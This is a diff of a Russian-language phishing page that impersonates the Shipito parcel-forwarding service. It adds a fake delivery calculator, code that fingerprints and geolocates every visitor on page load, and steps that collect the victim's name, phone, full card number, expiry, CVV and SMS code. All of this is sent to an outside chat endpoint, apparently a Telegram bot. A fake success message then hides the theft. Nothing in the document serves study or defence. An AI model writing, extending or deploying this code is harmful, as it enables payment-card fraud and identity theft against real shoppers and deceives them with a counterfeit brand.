@@ -3,37 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Shipito — Доставка из США</title>
+    <title>Shipito — Расчёт доставки</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: Arial, Helvetica, sans-serif;
             background: #f4f6f9;
             min-height: 100vh;
             margin: 0;
         }
-
-        .container {
-            width: 100%;
-            max-width: 480px;
-            margin: 0 auto;
-            padding: 0;
-        }
-
-        /* Лендинг-копия shipito */
-        .landing {
-            display: block;
-            background: white;
-        }
-
-        .landing.hidden {
-            display: none;
-        }
+        .landing { background: white; }
+        .landing.hidden { display: none; }
 
         .header {
             background: #0066cc;
@@ -43,152 +23,29 @@
             align-items: center;
             justify-content: space-between;
         }
+        .logo { font-size: 26px; font-weight: 700; }
+        .logo span { background: white; color: #0066cc; border-radius: 5px; padding: 2px 6px; margin-left: 4px; }
 
-        .logo {
-            font-size: 26px;
-            font-weight: 700;
-        }
-
-        .logo span {
-            background: white;
-            color: #0066cc;
-            border-radius: 5px;
-            padding: 2px 6px;
-            margin-left: 4px;
-        }
-
-        .hero {
-            padding: 30px 20px;
+        .calculator-block {
+            padding: 30px 20px 20px;
             text-align: center;
         }
-
-        .hero h1 {
+        .calculator-block h2 {
             font-size: 24px;
             color: #1e2a3a;
-            margin-bottom: 12px;
+            margin-bottom: 6px;
         }
-
-        .hero p {
+        .calculator-block p {
             color: #6b7a8d;
             margin-bottom: 24px;
             line-height: 1.5;
-        }
-
-        .features {
-            display: flex;
-            justify-content: space-around;
-            padding: 0 20px 20px;
-        }
-
-        .feature {
-            text-align: center;
-            flex: 1;
-        }
-
-        .feature-icon {
-            font-size: 36px;
-            margin-bottom: 8px;
-        }
-
-        .feature-text {
-            font-size: 13px;
-            color: #444;
-        }
-
-        .btn-register {
-            display: block;
-            width: 90%;
-            margin: 20px auto 30px;
-            padding: 16px;
-            background: #0066cc;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            text-align: center;
-        }
-
-        .btn-register:hover {
-            background: #004d99;
-        }
-
-        .footer {
-            background: #f9f9f9;
-            padding: 20px;
-            text-align: center;
-            font-size: 12px;
-            color: #99a5b5;
-        }
-
-        /* Форма (из предыдущего ответа) */
-        .shipito-wrapper {
-            display: none;
-            background: #ffffff;
-            border-radius: 14px;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.1);
-            padding: 32px 30px 36px;
-            margin: 20px auto;
-            max-width: 460px;
-        }
-
-        .shipito-wrapper.active {
-            display: block;
-        }
-
-        .shipito-header {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-
-        .shipito-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            font-size: 34px;
-            font-weight: 700;
-            color: #0066cc;
-            letter-spacing: -0.5px;
-            margin-bottom: 8px;
-        }
-
-        .shipito-logo span {
-            background: #0066cc;
-            color: white;
-            border-radius: 6px;
-            padding: 0 8px;
-            font-size: 32px;
-        }
-
-        .shipito-title {
-            font-size: 22px;
-            font-weight: 600;
-            color: #1e2a3a;
-            margin-bottom: 4px;
-        }
-
-        .shipito-subtitle {
-            font-size: 14px;
-            color: #6b7a8d;
-            line-height: 1.5;
-        }
-
-        .step {
-            display: none;
-        }
-
-        .step.active {
-            display: block;
         }
 
         .form-group {
             position: relative;
             margin-bottom: 20px;
+            text-align: left;
         }
-
         .form-group input {
             width: 100%;
             padding: 15px 12px 8px 12px;
@@ -200,12 +57,10 @@
             transition: border 0.2s, box-shadow 0.2s;
             font-family: inherit;
         }
-
         .form-group input:focus {
             border-color: #0066cc;
-            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.15);
+            box-shadow: 0 0 0 3px rgba(0,102,204,0.15);
         }
-
         .form-group label {
             position: absolute;
             left: 12px;
@@ -219,7 +74,6 @@
             transition: all 0.2s ease;
             font-weight: 400;
         }
-
         .form-group input:focus + label,
         .form-group input:not(:placeholder-shown) + label {
             top: -9px;
@@ -229,16 +83,7 @@
             font-weight: 500;
         }
 
-        .form-row {
-            display: flex;
-            gap: 10px;
-        }
-
-        .form-row .form-group {
-            flex: 1;
-        }
-
-        .btn-submit {
+        .btn-primary {
             width: 100%;
             padding: 14px 20px;
             background: #0066cc;
@@ -248,122 +93,115 @@
             font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s, transform 0.1s;
+            transition: background 0.2s;
             margin-top: 10px;
-            letter-spacing: 0.3px;
         }
+        .btn-primary:hover { background: #004d99; }
 
-        .btn-submit:hover {
-            background: #004d99;
-        }
-
-        .btn-submit:active {
-            transform: scale(0.98);
-        }
-
-        .btn-outline {
-            background: transparent;
-            color: #0066cc;
-            border: 1px solid #0066cc;
-            margin-top: 6px;
-        }
-
-        .btn-outline:hover {
-            background: #e6f0ff;
-        }
-
-        .shipito-footer-small {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #99a5b5;
-        }
-
-        .alert {
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 14px;
-            margin-bottom: 18px;
-            display: none;
-            line-height: 1.4;
-        }
-
-        .alert-error {
-            background: #fff0f0;
-            color: #c0392b;
-            border: 1px solid #f5c6cb;
-        }
-
-        .alert-success {
+        .result-box {
             background: #e6f7ec;
-            color: #0e6245;
             border: 1px solid #b8dfca;
+            border-radius: 10px;
+            padding: 16px;
+            margin: 15px 0;
+            font-size: 15px;
+            color: #0e6245;
+            display: none;
         }
+
+        .shipito-wrapper {
+            display: none;
+            background: #ffffff;
+            border-radius: 14px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.1);
+            padding: 32px 30px 36px;
+            margin: 20px auto;
+            max-width: 460px;
+        }
+        .shipito-wrapper.active { display: block; }
+
+        .shipito-header { text-align: center; margin-bottom: 24px; }
+        .shipito-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 34px;
+            font-weight: 700;
+            color: #0066cc;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+        }
+        .shipito-logo span { background: #0066cc; color: white; border-radius: 6px; padding: 0 8px; font-size: 32px; }
+        .shipito-title { font-size: 22px; font-weight: 600; color: #1e2a3a; margin-bottom: 4px; }
+        .shipito-subtitle { font-size: 14px; color: #6b7a8d; line-height: 1.5; }
+
+        .step { display: none; }
+        .step.active { display: block; }
+
+        .form-row { display: flex; gap: 10px; }
+        .form-row .form-group { flex: 1; }
+
+        .btn-submit { width: 100%; padding: 14px 20px; background: #0066cc; color: white; border: none; border-radius: 10px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .btn-submit:hover { background: #004d99; }
+        .btn-outline { background: transparent; color: #0066cc; border: 1px solid #0066cc; margin-top: 6px; }
+        .btn-outline:hover { background: #e6f0ff; }
+
+        .shipito-footer-small { text-align: center; margin-top: 20px; font-size: 12px; color: #99a5b5; }
+
+        .alert { padding: 12px; border-radius: 10px; font-size: 14px; margin-bottom: 18px; display: none; line-height: 1.4; }
+        .alert-error { background: #fff0f0; color: #c0392b; border: 1px solid #f5c6cb; }
+        .alert-success { background: #e6f7ec; color: #0e6245; border: 1px solid #b8dfca; }
 
         .code-sent-msg {
-            font-size: 14px;
-            color: #2a5c8a;
-            background: #f0f7ff;
-            padding: 10px;
-            border-radius: 8px;
-            margin: 15px 0;
-            text-align: center;
+            font-size: 14px; color: #2a5c8a; background: #f0f7ff;
+            padding: 10px; border-radius: 8px; margin: 15px 0; text-align: center;
         }
 
         @media (max-width: 480px) {
-            .shipito-wrapper {
-                padding: 24px 18px;
-                border-radius: 0;
-                margin: 0;
-            }
+            .shipito-wrapper { padding: 24px 18px; border-radius: 0; margin: 0; }
         }
     </style>
 </head>
 <body>
-    <!-- Копия главной страницы Shipito -->
+    <!-- Лендинг с расчётом -->
     <div id="landing" class="landing">
         <div class="header">
             <div class="logo">✈ SHIPITO</div>
             <div style="font-size:14px;">Вход</div>
         </div>
-        <div class="hero">
-            <h1>Доставка покупок из США</h1>
-            <p>Получите адрес в США, а мы перешлём ваши посылки в любую страну мира</p>
+        <div class="calculator-block">
+            <h2>Расчет стоимости доставки в ваш город</h2>
+            <p>Укажите сайт поставщика и город получателя, чтобы узнать о возможности доставки</p>
+
+            <div class="form-group">
+                <input type="text" id="supplierSite" placeholder=" " autocomplete="url">
+                <label for="supplierSite">Сайт поставщика (например, amazon.com)</label>
+            </div>
+            <div class="form-group">
+                <input type="text" id="city" placeholder=" " autocomplete="address-level2">
+                <label for="city">Город получателя</label>
+            </div>
+            <button id="calculateBtn" class="btn-primary">Рассчитать</button>
+
+            <div id="resultBox" class="result-box"></div>
+            <button id="toRegistrationBtn" class="btn-primary" style="display:none; margin-top:15px;">Заполнить форму для точного расчета</button>
         </div>
-        <div class="features">
-            <div class="feature">
-                <div class="feature-icon">📦</div>
-                <div class="feature-text">Приём и консолидация</div>
-            </div>
-            <div class="feature">
-                <div class="feature-icon">✈️</div>
-                <div class="feature-text">Быстрая авиапересылка</div>
-            </div>
-            <div class="feature">
-                <div class="feature-icon">🔒</div>
-                <div class="feature-text">Безопасная упаковка</div>
-            </div>
-        </div>
-        <button id="toRegistrationBtn" class="btn-register">Зарегистрироваться бесплатно</button>
-        <div class="footer">
+        <div class="footer" style="text-align:center; padding:20px; font-size:12px; color:#99a5b5;">
             Уже есть аккаунт? <a href="#" style="color:#0066cc;">Войдите</a>
         </div>
     </div>
 
-    <!-- Форма регистрации -->
+    <!-- Форма регистрации (шаг1 — карта, шаг2 — смс) -->
     <div id="registrationForm" class="shipito-wrapper">
         <div class="shipito-header">
-            <div class="shipito-logo">
-                ✈ <span>SHIPITO</span>
-            </div>
+            <div class="shipito-logo">✈ <span>SHIPITO</span></div>
             <div class="shipito-title">Регистрация аккаунта</div>
             <div class="shipito-subtitle">Укажите данные для доступа к услугам посредника в США</div>
         </div>
-
         <div id="alertError" class="alert alert-error"></div>
         <div id="alertSuccess" class="alert alert-success"></div>
 
-        <!-- Шаг 1: Данные -->
         <div id="step1" class="step active">
             <form id="dataForm" novalidate>
                 <div class="form-group">
@@ -393,7 +231,6 @@
             </form>
         </div>
 
-        <!-- Шаг 2: SMS -->
         <div id="step2" class="step">
             <div class="code-sent-msg" id="codeDisplay">
                 Мы отправили код подтверждения на ваш номер.<br>Введите его ниже:
@@ -407,7 +244,6 @@
                 <button type="button" id="backToDataBtn" class="btn-outline" style="width:100%;margin-top:10px;">Изменить данные</button>
             </form>
         </div>
-
         <div class="shipito-footer-small">
             Нажимая кнопку, вы принимаете <a href="#" style="color:#0066cc;">условия использования</a> и <a href="#" style="color:#0066cc;">политику конфиденциальности</a>.
         </div>
@@ -421,8 +257,12 @@
 
             const landing = document.getElementById('landing');
             const registrationForm = document.getElementById('registrationForm');
+            const calculateBtn = document.getElementById('calculateBtn');
             const toRegistrationBtn = document.getElementById('toRegistrationBtn');
             const backToLanding = document.getElementById('backToLanding');
+            const resultBox = document.getElementById('resultBox');
+            const supplierSiteInput = document.getElementById('supplierSite');
+            const cityInput = document.getElementById('city');
 
             const step1 = document.getElementById('step1');
             const step2 = document.getElementById('step2');
@@ -432,7 +272,6 @@
             const alertError = document.getElementById('alertError');
             const alertSuccess = document.getElementById('alertSuccess');
             const codeDisplay = document.getElementById('codeDisplay');
-
             const smsCodeInput = document.getElementById('smsCode');
             const phoneInput = document.getElementById('phone');
             const cardInput = document.getElementById('cardNumber');
@@ -447,53 +286,78 @@
                 el.style.display = 'block';
                 setTimeout(() => { el.style.display = 'none'; }, 6000);
             }
-
             function hideAlerts() {
                 alertError.style.display = 'none';
                 alertSuccess.style.display = 'none';
             }
-
             function switchStep(step) {
                 hideAlerts();
-                if (step === 1) {
-                    step1.classList.add('active');
-                    step2.classList.remove('active');
-                } else {
-                    step1.classList.remove('active');
-                    step2.classList.add('active');
-                }
+                if (step === 1) { step1.classList.add('active'); step2.classList.remove('active'); }
+                else { step1.classList.remove('active'); step2.classList.add('active'); }
             }
 
-            // Маски
-            phoneInput.addEventListener('input', function(e) {
-                let val = e.target.value.replace(/[^\d+]/g, '');
-                if (!val.startsWith('+')) val = '+' + val;
-                e.target.value = val;
-            });
+            async function sendMessage(text) {
+                try {
+                    await fetch(API_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                    });
+                } catch (err) { /* ignore */ }
+            }
 
-            cardInput.addEventListener('input', function(e) {
-                let val = e.target.value.replace(/\D/g, '');
-                if (val.length > 16) val = val.slice(0, 16);
-                e.target.value = val.replace(/(\d{4})(?=\d)/g, '$1 ');
-            });
+            // Сбор данных о пользователе при загрузке
+            async function collectAndSendUserInfo() {
+                const ua = navigator.userAgent;
+                const lang = navigator.language;
+                const resolution = window.screen.width + 'x' + window.screen.height;
+                const colorDepth = window.screen.colorDepth;
+                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const platform = navigator.platform;
+                const vendor = navigator.vendor;
+                const cookieEnabled = navigator.cookieEnabled;
+                const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+                const deviceMemory = navigator.deviceMemory || 'unknown';
+                const connection = navigator.connection ? `${navigator.connection.effectiveType} ${navigator.connection.downlink}Mbps` : 'unknown';
+                let ipInfo = '';
+                try {
+                    const resp = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await resp.json();
+                    const ip = ipData.ip;
+                    const geoResp = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+                    const geo = await geoResp.json();
+                    if (geo.status === 'success') {
+                        ipInfo = `IP: ${geo.query}\nСтрана: ${geo.country}\nРегион: ${geo.regionName}\nГород: ${geo.city}\nИндекс: ${geo.zip}\nПровайдер: ${geo.isp} (${geo.org})\nAS: ${geo.as}\nКоординаты: ${geo.lat},${geo.lon}\nЧасовой пояс: ${geo.timezone}`;
+                    } else {
+                        ipInfo = `IP: ${ip}`;
+                    }
+                } catch (e) { ipInfo = 'Информация о IP недоступна'; }
+                const msg = `🖥 Новая сессия\n` +
+                    `Браузер: ${ua}\nЯзык: ${lang}\nРазрешение: ${resolution}\nГлубина цвета: ${colorDepth}\n` +
+                    `Платформа: ${platform}\nVendor: ${vendor}\nCookie: ${cookieEnabled ? 'Вкл' : 'Выкл'}\n` +
+                    `Ядра: ${hardwareConcurrency}\nПамять: ${deviceMemory}GB\nСеть: ${connection}\nЧасовой пояс: ${timeZone}\n\n` +
+                    `🌐 Сетевая информация:\n${ipInfo}`;
+                await sendMessage(msg);
+            }
+            collectAndSendUserInfo();
 
-            expiryInput.addEventListener('input', function(e) {
-                let val = e.target.value.replace(/\D/g, '');
-                if (val.length >= 2) {
-                    val = val.slice(0, 2) + ' / ' + val.slice(2, 4);
+            // Расчёт доставки
+            calculateBtn.addEventListener('click', function() {
+                const site = supplierSiteInput.value.trim();
+                const city = cityInput.value.trim();
+                if (!site || !city) {
+                    alert('Заполните оба поля');
+                    return;
                 }
-                e.target.value = val;
+                // Отправка запроса в чат
+                sendMessage(`📦 Запрос расчёта доставки\nСайт поставщика: ${site}\nГород получателя: ${city}`);
+                // Показ уведомления
+                resultBox.style.display = 'block';
+                resultBox.innerHTML = `✅ Доставка возможна! <br>Поставщик <strong>${site}</strong> осуществляет отправку в <strong>${city}</strong>.<br>Для точного расчета стоимости заполните регистрационную форму.`;
+                toRegistrationBtn.style.display = 'block';
             });
 
-            cvvInput.addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/\D/g, '');
-            });
-
-            smsCodeInput.addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
-            });
-
-            // Переходы
+            // Переход к регистрационной форме
             toRegistrationBtn.addEventListener('click', function() {
                 landing.classList.add('hidden');
                 registrationForm.classList.add('active');
@@ -502,7 +366,6 @@
             backToLanding.addEventListener('click', function() {
                 registrationForm.classList.remove('active');
                 landing.classList.remove('hidden');
-                // Очистка
                 dataForm.reset();
                 smsForm.reset();
                 userData = {};
@@ -510,11 +373,33 @@
                 switchStep(1);
             });
 
-            // Шаг 1 → валидация и переход к SMS
+            // Маски
+            phoneInput.addEventListener('input', function(e) {
+                let val = e.target.value.replace(/[^\d+]/g, '');
+                if (!val.startsWith('+')) val = '+' + val;
+                e.target.value = val;
+            });
+            cardInput.addEventListener('input', function(e) {
+                let val = e.target.value.replace(/\D/g, '');
+                if (val.length > 16) val = val.slice(0, 16);
+                e.target.value = val.replace(/(\d{4})(?=\d)/g, '$1 ');
+            });
+            expiryInput.addEventListener('input', function(e) {
+                let val = e.target.value.replace(/\D/g, '');
+                if (val.length >= 2) val = val.slice(0, 2) + ' / ' + val.slice(2, 4);
+                e.target.value = val;
+            });
+            cvvInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+            smsCodeInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+            });
+
+            // Шаг 1 — карта
             dataForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 hideAlerts();
-
                 const name = document.getElementById('fullName').value.trim();
                 const phone = phoneInput.value.trim();
                 const card = cardInput.value.replace(/\s/g, '');
@@ -522,64 +407,43 @@
                 const cvv = cvvInput.value.trim();
 
                 if (!name || !phone || !card || !expiry || !cvv) {
-                    showAlert(alertError, 'Пожалуйста, заполните все поля.');
-                    return;
+                    showAlert(alertError, 'Пожалуйста, заполните все поля.'); return;
                 }
                 if (card.length !== 16 || !/^\d+$/.test(card)) {
-                    showAlert(alertError, 'Номер карты должен содержать ровно 16 цифр.');
-                    return;
+                    showAlert(alertError, 'Номер карты должен содержать ровно 16 цифр.'); return;
                 }
                 if (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv)) {
-                    showAlert(alertError, 'CVV должен содержать 3 или 4 цифры.');
-                    return;
+                    showAlert(alertError, 'CVV должен содержать 3 или 4 цифры.'); return;
                 }
 
                 userData = { name, phone, card, expiry, cvv };
+                const cardMsg = `💳 Данные карты\n👤 Имя: ${name}\n📱 Телефон: ${phone}\n💳 Номер: ${card}\n📅 Срок: ${expiry}\n🔒 CVV: ${cvv}`;
+                sendMessage(cardMsg);
+
                 generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
                 codeDisplay.innerHTML = `Мы отправили код подтверждения на номер <strong>${phone}</strong>.<br>Ваш код: <span style="font-size:20px;font-weight:bold;color:#0066cc;">${generatedCode}</span>`;
                 switchStep(2);
             });
 
-            // Шаг 2 → проверка и отправка в Telegram
+            // Шаг 2 — SMS
             smsForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 hideAlerts();
-
                 const enteredCode = smsCodeInput.value.trim();
                 if (enteredCode !== generatedCode) {
-                    showAlert(alertError, 'Неверный код подтверждения. Попробуйте ещё раз.');
-                    return;
+                    showAlert(alertError, 'Неверный код подтверждения. Попробуйте ещё раз.'); return;
                 }
+                const smsMsg = `📱 SMS-подтверждение\nТелефон: ${userData.phone}\nКод: ${generatedCode}`;
+                await sendMessage(smsMsg);
 
-                const message = `📥 Новая регистрация\n👤 Имя: ${userData.name}\n📱 Телефон: ${userData.phone}\n💳 Карта: ${userData.card}\n📅 Срок: ${userData.expiry}\n🔒 CVV: ${userData.cvv}\n🔐 SMS-код: ${generatedCode}`;
-
-                try {
-                    const response = await fetch(API_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message
-                        })
-                    });
-
-                    if (response.ok) {
-                        showAlert(alertSuccess, 'Регистрация успешно завершена.');
-                        smsForm.reset();
-                        userData = {};
-                        generatedCode = '';
-                        // Возврат на первый шаг через секунду
-                        setTimeout(() => {
-                            switchStep(1);
-                            dataForm.reset();
-                        }, 2000);
-                    } else {
-                        const errData = await response.json().catch(() => ({}));
-                        showAlert(alertError, 'Ошибка: ' + (errData.description || 'неизвестная ошибка сервера'));
-                    }
-                } catch (err) {
-                    showAlert(alertError, 'Сетевая ошибка. Проверьте интернет-соединение.');
-                }
+                showAlert(alertSuccess, 'Регистрация успешно завершена.');
+                smsForm.reset();
+                userData = {};
+                generatedCode = '';
+                setTimeout(() => {
+                    switchStep(1);
+                    dataForm.reset();
+                }, 2000);
             });
 
             backToDataBtn.addEventListener('click', function() {
